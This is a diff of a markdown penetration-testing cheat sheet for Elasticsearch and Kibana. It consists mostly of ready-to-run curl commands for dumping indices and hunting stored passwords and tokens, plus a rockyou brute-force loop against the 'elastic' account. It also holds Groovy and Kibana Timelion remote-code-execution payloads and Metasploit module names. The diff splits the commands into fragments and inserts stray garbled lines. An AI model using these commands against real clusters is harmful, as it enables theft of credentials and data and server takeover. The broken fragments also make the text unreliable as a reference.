@@ -3,7 +3,7 @@ id: "t87j6h23fmptl1kuy"
 title: "elasticsearch"
 description: ""
 tags: []
-order: 10
+order: "10"
 createdAt: "2026-05-31T09:33:53.242Z"
 updatedAt: "2026-05-31T09:34:05.669Z"
 ---
@@ -111,6 +111,8 @@ curl -s http://$TARGET:9200/_cluster/stats | python3 -m json.tool
 curl -s http://$TARGET:9200/_cat/pending_tasks
 ```
 
+_cat/pending_
+
 **Tags:** elasticsearch, unauthenticated, enumeration
 <!-- cmd: {"id":"9vhax7k0imptl1u4v","language":"bash","sectionId":"j7enf6kvkmptl1u18","tags":["elasticsearch","unauthenticated","enumeration"]} -->
 
@@ -145,7 +147,7 @@ curl -s "http://$TARGET:9200/$INDEX/_search?scroll=1m" -H "Content-Type: applica
 
 ### d1ok8vw7wmptl1u5r
 ```bash
-  -d '{"size": 1000, "query": {"match_all": {}}}'
+-d '{"size": 1000, "query": {"match_all": {}}}'
 ```
 
 **Tags:** elasticsearch, datadump, exfiltration, credentials
@@ -177,8 +179,10 @@ curl -s "http://$TARGET:9200/_search?pretty" -H "Content-Type: application/json"
 
 ### o32roaomsmptl1u69
 ```bash
-  -d '{"query":{"query_string":{"query":"password OR passwd OR secret OR token OR api_key"}}}'
+-d '{"query":{"query_string":{"query":"password OR passwd OR secret OR token OR api_key"}}}'
 ```
+
+_string":{"query":"password OR passwd OR secret OR token OR api_
 
 **Tags:** elasticsearch, datadump, exfiltration, credentials
 <!-- cmd: {"id":"o32roaomsmptl1u69","language":"bash","sectionId":"84j3ub3mumptl1u1e","tags":["elasticsearch","datadump","exfiltration","credentials"]} -->
@@ -187,6 +191,8 @@ curl -s "http://$TARGET:9200/_search?pretty" -H "Content-Type: application/json"
 ```bash
 curl -s "http://$TARGET:9200/_all/_search?q=password&size=100&pretty"
 ```
+
+_all/_
 
 **Tags:** elasticsearch, datadump, exfiltration, credentials
 <!-- cmd: {"id":"29ddffcu3mptl1u6f","language":"bash","sectionId":"84j3ub3mumptl1u1e","tags":["elasticsearch","datadump","exfiltration","credentials"]} -->
@@ -208,6 +214,8 @@ _Index Mapping (Schema) Understand data structure before dumping._
 ```bash
 curl -s http://$TARGET:9200/_all/_mapping | python3 -m json.tool
 ```
+
+_all/_
 
 **Tags:** elasticsearch, enumeration, mapping
 <!-- cmd: {"id":"la4kl0o81mptl1u6z","language":"bash","sectionId":"bidpk2033mptl1u1i","tags":["elasticsearch","enumeration","mapping"]} -->
@@ -288,7 +296,7 @@ for pass in $(cat rockyou.txt); do
 
 ### iqz12vex1mptl1u8o
 ```bash
-  code=$(curl -s -o /dev/null -w "%{http_code}" -u elastic:$pass http://$TARGET:9200/)
+code=$(curl -s -o /dev/null -w "%{http_code}" -u elastic:$pass http://$TARGET:9200/)
 ```
 
 **Tags:** elasticsearch, bruteforce
@@ -296,7 +304,7 @@ for pass in $(cat rockyou.txt); do
 
 ### xyymznja9mptl1u8u
 ```bash
-  [ "$code" = "200" ] && echo "FOUND: elastic:$pass" && break
+[ "$code" = "200" ] && echo "FOUND: elastic:$pass" && break
 ```
 
 **Tags:** elasticsearch, bruteforce
@@ -325,7 +333,7 @@ _Sensitive Data Hunting Common index names that contain valuable data._
 
 ### 4p9zditnsmptl1u9b
 ```bash
-  count=$(curl -s "http://$TARGET:9200/$index/_count" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('count','N/A'))" 2>/dev/null)
+count=$(curl -s "http://$TARGET:9200/$index/_count" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('count','N/A'))" 2>/dev/null)
 ```
 
 **Tags:** elasticsearch, sensitive-data, credentials, hunting
@@ -333,7 +341,7 @@ _Sensitive Data Hunting Common index names that contain valuable data._
 
 ### tvcawhpb6mptl1u9g
 ```bash
-  echo "$index: $count docs"
+echo "$index: $count docs"
 ```
 
 **Tags:** elasticsearch, sensitive-data, credentials, hunting
@@ -402,7 +410,7 @@ _RCE via Dynamic Scripts (Old Versions) Elasticsearch < 1.6 allows arbitrary Gro
 
 ### 9l7zc9qhimptl1uax
 ```bash
-  "size": 1,
+"size": 1,
 ```
 
 **Tags:** elasticsearch, rce, groovy, cve, exploitation
@@ -410,7 +418,7 @@ _RCE via Dynamic Scripts (Old Versions) Elasticsearch < 1.6 allows arbitrary Gro
 
 ### n01v57ygmmptl1ub1
 ```bash
-  "query": {"filtered": {"query": {"match_all": {}}}},
+"query": {"filtered": {"query": {"match_all": {}}}},
 ```
 
 **Tags:** elasticsearch, rce, groovy, cve, exploitation
@@ -418,7 +426,7 @@ _RCE via Dynamic Scripts (Old Versions) Elasticsearch < 1.6 allows arbitrary Gro
 
 ### gx7actu12mptl1ub6
 ```bash
-  "script_fields": {
+"script_fields": {
 ```
 
 **Tags:** elasticsearch, rce, groovy, cve, exploitation
@@ -426,7 +434,7 @@ _RCE via Dynamic Scripts (Old Versions) Elasticsearch < 1.6 allows arbitrary Gro
 
 ### 5oc59hsgcmptl1uba
 ```bash
-    "cmd": {
+"cmd": {
 ```
 
 **Tags:** elasticsearch, rce, groovy, cve, exploitation
@@ -434,7 +442,7 @@ _RCE via Dynamic Scripts (Old Versions) Elasticsearch < 1.6 allows arbitrary Gro
 
 ### wvqjucmtsmptl1ubf
 ```bash
-      "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next()"
+"script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next()"
 ```
 
 **Tags:** elasticsearch, rce, groovy, cve, exploitation
@@ -442,7 +450,7 @@ _RCE via Dynamic Scripts (Old Versions) Elasticsearch < 1.6 allows arbitrary Gro
 
 ### m87hlo6simptl1ubj
 ```bash
-    }
+}
 ```
 
 **Tags:** elasticsearch, rce, groovy, cve, exploitation
@@ -450,7 +458,7 @@ _RCE via Dynamic Scripts (Old Versions) Elasticsearch < 1.6 allows arbitrary Gro
 
 ### jb2d7ezfmmptl1ubo
 ```bash
-  }
+}
 ```
 
 **Tags:** elasticsearch, rce, groovy, cve, exploitation
@@ -468,6 +476,8 @@ _RCE via Dynamic Scripts (Old Versions) Elasticsearch < 1.6 allows arbitrary Gro
 ```bash
 use exploit/multi/elasticsearch/script_mvel_rce
 ```
+
+_mvel_
 
 **Tags:** elasticsearch, rce, groovy, cve, exploitation
 <!-- cmd: {"id":"kth0tvqt9mptl1ubx","language":"bash","sectionId":"zp6z9qpvwmptl1u1y","tags":["elasticsearch","rce","groovy","cve","exploitation"]} -->
@@ -540,7 +550,7 @@ curl -s -X POST "http://$TARGET:5601/api/timelion/run" \
 
 ### 5qa3x15c5mptl1udh
 ```bash
-  -H "Content-Type: application/json" \
+-H "Content-Type: application/json" \
 ```
 
 **Tags:** kibana, rce, cve, exploitation
@@ -548,7 +558,7 @@ curl -s -X POST "http://$TARGET:5601/api/timelion/run" \
 
 ### 30un4ulhhmptl1udm
 ```bash
-  -H "kbn-xsrf: true" \
+-H "kbn-xsrf: true" \
 ```
 
 **Tags:** kibana, rce, cve, exploitation
@@ -556,7 +566,7 @@ curl -s -X POST "http://$TARGET:5601/api/timelion/run" \
 
 ### woafqt4zymptl1udq
 ```bash
-  -d '{"sheet":["#"])}\nvar process = require(\"child_process\");process.exec(\"id > /tmp/pwned\");"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"auto","timezone":"UTC"}}'
+-d '{"sheet":["#"])}\nvar process = require(\"child_process\");process.exec(\"id > /tmp/pwned\");"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"auto","timezone":"UTC"}}'
 ```
 
 **Tags:** kibana, rce, cve, exploitation
@@ -566,6 +576,8 @@ curl -s -X POST "http://$TARGET:5601/api/timelion/run" \
 ```bash
 use exploit/multi/elastic/kibana_timelion_prototype_pollution_rce
 ```
+
+_timelion_
 
 **Tags:** kibana, rce, cve, exploitation
 <!-- cmd: {"id":"p0ns8hmy9mptl1udv","language":"bash","sectionId":"iqpm7z97lmptl1u28","tags":["kibana","rce","cve","exploitation"]} -->
@@ -635,6 +647,8 @@ curl -s http://$TARGET:5601/api/status
 ```bash
 curl -s http://$TARGET:9200/_xpack/security/_authenticate 2>/dev/null
 ```
+
+_xpack/security/_
 
 **Tags:** elasticsearch, misconfiguration, hardening
 <!-- cmd: {"id":"jge6wsif8mptl1uf5","language":"bash","sectionId":"t248od8ikmptl1u2d","tags":["elasticsearch","misconfiguration","hardening"]} -->
